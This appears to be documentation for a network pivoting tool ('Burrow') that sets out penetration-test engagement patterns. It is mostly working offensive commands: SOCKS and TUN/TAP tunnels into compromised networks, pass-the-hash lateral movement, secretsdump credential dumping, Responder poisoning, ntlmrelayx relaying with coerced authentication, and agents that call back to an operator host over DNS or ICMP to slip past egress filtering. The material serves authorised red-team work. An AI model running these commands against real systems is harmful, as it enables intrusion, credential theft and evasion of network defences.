# Engagement Patterns

Real-world scenarios showing which methods to use, how to set them up, and what to do when the primary approach doesn't work.

---

## Pattern 1: Standard Internal Pentest

**Situation:** You have a foothold on an internal workstation. Network is flat (no segmentation). You need to enumerate and attack the Active Directory environment.

**Primary approach:** SOCKS5 + selective port forwards

```
┌─ Your Kali ──────────────────────────────────────┐
│                                                    │
│  SOCKS5 127.0.0.1:1080                            │
│    ├── proxychains crackmapexec smb 10.0.0.0/24   │
│    ├── proxychains evil-winrm -i DC01             │
│    └── proxychains bloodhound-python              │
│                                                    │
│  Port Forward 127.0.0.1:88 → DC01:88             │
│    └── Kerberos tools (Rubeus via proxychains     │
│        or directly against localhost:88)           │
│                                                    │
└────────────────────────────────────────────────────┘
```

**Commands:**
```bash
# Start SOCKS5 (TUI: select session → enter → s)

# Enumeration
proxychains crackmapexec smb 10.0.0.0/24
proxychains nmap -sT -Pn -p 445,389,88,5985 10.0.0.0/24

# BloodHound
proxychains bloodhound-python -c All -d domain.local -u user -p pass -ns 10.0.0.1

# Lateral movement
proxychains evil-winrm -i 10.0.0.5 -u admin -H NTHASH
proxychains impacket-psexec domain/admin@10.0.0.5
```

**Upgrade to TUN if:** You need UDP (DNS, SNMP) or you're doing heavy scanning and proxychains overhead is painful.

---

## Pattern 2: Active Directory Attack with Hash Capture

**Situation:** You need to capture NTLM hashes via LLMNR/NBT-NS poisoning, then relay them to LDAP for privilege escalation.

**This is the scenario that demands TAP mode.** Without it, broadcast traffic doesn't cross the tunnel.

### Option A: TAP Mode (Best — no root needed on agent)

```
┌─ Your Kali (sudo for server) ────────────────────────────┐
│                                                            │
│  burrow-tap0 (10.10.10.200/24) ← assigned by Ctrl+A       │
│    ├── Terminal 1: responder -I burrow-tap0 -w -d          │
│    ├── Terminal 2: ntlmrelayx.py -t ldap://DC01 -l loot   │
│    └── Coerce: nxc ... -o L=10.10.10.200                   │
│                                                            │
│  SOCKS5 127.0.0.1:1080                                     │
│    └── proxychains secretsdump (after escalation)           │
│                                                            │
└────────────────────────────────────────────────────────────┘
```

**Step by step:**
```bash
# 1. Start TAP: Ctrl+A in TUI
#    Burrow prompts: TAP IP [10.10.10.200/24], Route [10.10.10.0/24]
#    Verify .200 is unused, hit Enter
#    TAP interface created + IP assigned + route added automatically

# 2. Start Responder
sudo responder -I burrow-tap0 -w -d -P

# 3. Start ntlmrelayx in another terminal
sudo ntlmrelayx.py -t ldap://10.10.10.1 -l loot --delegate-access

# 4. Coerce the DC to authenticate to your TAP IP
nxc smb 10.10.10.225 -u user -p pass -M coerce_plus -o L=10.10.10.200

# 5. ntlmrelayx captures the auth and relays to LDAP
# 6. After escalation, use SOCKS5 for follow-up
proxychains impacket-secretsdump domain/admin@DC01
```

### Option B: Reverse Port Forward (Fallback)

If you want to relay through a Windows agent instead of using TAP, you need to deal with the **Windows port 445 conflict**. See the troubleshooting section for details.

**B1: Run Inveigh on the agent directly**
```bash
# Upload Inveigh to agent via Burrow file transfer
# Execute via Burrow exec command
# Inveigh runs ON the target network — sees broadcast natively
# Pull captured hashes back via file download
```

**B2: Reverse port forward for ntlmrelayx**
```bash
# In TUI: add remote tunnel
#   Agent listens: 0.0.0.0:445
#   Forwards to:   127.0.0.1:445

# Run ntlmrelayx locally listening on 445
sudo ntlmrelayx.py -t ldap://DC01 -smb2support

# When a victim connects to agent_ip:445, the auth
# gets forwarded back to your ntlmrelayx

# NOTE: This only works if you can coerce authentication
# TO the agent's IP (e.g., via PrinterBug, PetitPotam)
# You still need another way to trigger the auth
```

**B3: Combine approaches**
```bash
# Run Inveigh on agent (captures broadcast, poisons responses)
# But point victims at agent IP, where you have a reverse port
# forward back to your ntlmrelayx

# This gets you hash capture (Inveigh) + relay (ntlmrelayx)
# without TAP mode
```

### Why Inveigh Works but Responder Doesn't (Without TAP)

```
WITHOUT TAP:
┌─ Agent (on target network) ─────┐     ┌─ Your Kali ─────────────┐
│                                  │     │                          │
│ Can see: LLMNR broadcast  ✓     │     │ Responder running        │
│ Can see: NBT-NS broadcast ✓     │─ ─ ─│ Can see: nothing from    │
│ Can see: ARP              ✓     │     │ target network           │
│                                  │     │                          │
│ Inveigh runs here → sees all    │     │ Broadcast doesn't cross  │
│                                  │     │ the L3/L4 tunnel         │
└──────────────────────────────────┘     └──────────────────────────┘

WITH TAP:
┌─ Agent (raw socket) ────────────┐     ┌─ Your Kali ─────────────┐
│                                  │     │                          │
│ AF_PACKET captures ALL frames   │     │ burrow-tap0 receives     │
│ Including broadcast/multicast   │═════│ ALL Ethernet frames      │
│                                  │     │                          │
│ Frames forwarded through tunnel │     │ Responder sees broadcast │
│                                  │     │ and can respond          │
└──────────────────────────────────┘     └──────────────────────────┘
```

---

## Pattern 3: DMZ to Internal — Multi-Segment Pivot

**Situation:** You've compromised a web server in the DMZ. The internal corporate network is on a different VLAN. The web server has a dual-homed connection (DMZ + management VLAN), or you can reach a jump host from the DMZ.

```
Internet → [Firewall] → DMZ (10.10.0.0/24) → [Firewall] → Corp (10.20.0.0/24)
                          │                                    │
                       Web Server                          DC, File Server
                       (Agent 1)                           Workstations
                          │
                       Jump Host (10.10.0.50)
                       Has route to Corp VLAN
```

### Option A: Two Agents (Best)

Deploy a second agent on the jump host or a corp workstation, routed through the first agent.

```bash
# Agent 1 on web server connects to you
./burrow agent --connect YOUR_IP:11601 --fp FINGERPRINT

# Start SOCKS5 on Agent 1 session
# Use it to deploy Agent 2 on jump host

# Agent 2 on jump host (through Agent 1's SOCKS5)
# ... or Agent 2 connects directly if it has outbound access

# Now you have two sessions:
#   Session 1: DMZ access (10.10.0.0/24)
#   Session 2: Corp access (10.20.0.0/24)
```

### Option B: Pivot Chain

If deploying a second agent isn't possible, use Burrow's SOCKS5 on Agent 1 and chain through a SOCKS5 proxy on the jump host.

### Option C: TUN + Routes

If Agent 1 has routes to the Corp VLAN:
```bash
# TUN mode on Session 1
# Add routes for both networks:
#   r → 10.10.0.0/24  (DMZ)
#   r → 10.20.0.0/24  (Corp — if agent can route there)
```

---

## Pattern 4: Restrictive Egress — Getting Out

**Situation:** The compromised host has strict outbound filtering. Only certain ports or protocols are allowed.

### Step 1: Figure out what's allowed

```bash
# From the compromised host, test connectivity
curl -s http://YOUR_IP:80          # HTTP?
curl -s https://YOUR_IP:443        # HTTPS?
nslookup YOUR_DOMAIN               # DNS resolution?
ping YOUR_IP                       # ICMP?
```

### Step 2: Choose transport based on what works

```
HTTP/S allowed?
├── YES → WebSocket transport on port 443
│         burrow agent --connect YOUR_IP:443 --transport ws
│
└── NO ── DNS resolution works?
          ├── YES → DNS transport
          │         burrow agent --connect tunnel.yourdomain.com --transport dns
          │
          └── NO ── Ping works?
                    ├── YES → ICMP transport (needs root)
                    │         sudo burrow agent --connect YOUR_IP --transport icmp
                    │
                    └── NO ── Can you reach an HTTP port on the target?
                              ├── YES → HTTP tunnel (reverse direction)
                              │         burrow tunnel server --listen 0.0.0.0:8080
                              │
                              └── NO → You need a different initial access vector
```

### Progressive Upgrade Strategy

Start with whatever works, then upgrade if possible:

```
1. DNS transport (slow, but gets through)
   └── Establish session, start SOCKS5
       └── Use SOCKS5 to test if HTTPS outbound works from target
           └── If yes: deploy second agent with WebSocket transport
               └── Now you have fast connectivity
               └── Stop using DNS agent (or keep as fallback)
```

---

## Pattern 5: Cloud / Hybrid Environment

**Situation:** Target has on-prem AD with Azure AD Connect. Some resources are in Azure, some on-prem. You need access to both.

```bash
# Agent on Azure AD Connect server (dual-homed)
# Session gives you access to:
#   - On-prem AD (10.0.0.0/24)
#   - Azure management plane (if outbound allowed)

# TUN mode for on-prem scanning
# SOCKS5 for Azure management API access

# On-prem AD attack
proxychains bloodhound-python -c All -d corp.local -ns 10.0.0.1

# Azure enumeration (through SOCKS5)
proxychains az login
proxychains az ad user list
```

---

## Tool Compatibility Quick Reference

### Tools That Work Great Through SOCKS5

| Tool | Command |
|------|---------|
| nmap (connect scan) | `proxychains nmap -sT -Pn TARGET` |
| crackmapexec | `proxychains crackmapexec smb TARGET` |
| evil-winrm | `proxychains evil-winrm -i TARGET` |
| impacket-* | `proxychains impacket-secretsdump DOMAIN/user@TARGET` |
| bloodhound-python | `proxychains bloodhound-python -c All -d DOMAIN` |
| smbclient | `proxychains smbclient //TARGET/share` |
| ldapsearch | `proxychains ldapsearch -H ldap://TARGET` |
| curl | `curl --socks5 127.0.0.1:1080 http://TARGET` |
| Firefox/Burp | Native SOCKS5 proxy configuration |
| chisel/ligolo | Can chain through Burrow's SOCKS5 |

### Tools That Need TUN Mode

| Tool | Why |
|------|-----|
| nmap -sS (SYN scan) | Sends raw IP packets, not TCP connections |
| ping / fping | ICMP — not TCP |
| dig / nslookup | DNS uses UDP 53 |
| snmpwalk | SNMP uses UDP 161 |
| traceroute | ICMP or UDP |
| Any tool that binds raw sockets | Needs IP-level access |

### Tools That Need TAP Mode

| Tool | Why |
|------|-----|
| Responder | Listens for LLMNR/NBT-NS/mDNS broadcast |
| mitm6 | IPv6 DNS takeover via multicast |
| Bettercap | ARP spoofing requires L2 |
| Ettercap | L2 man-in-the-middle |
| DHCPig | DHCP starvation via broadcast |

### Tools That Need Reverse Port Forward

| Tool | Why |
|------|-----|
| ntlmrelayx (capture side) | Needs victims to connect TO you |
| Metasploit handler | Payload callbacks need to reach you |
| Any reverse shell listener | Shells connect back to your port |
| Covenant/Sliver listeners | C2 callbacks |
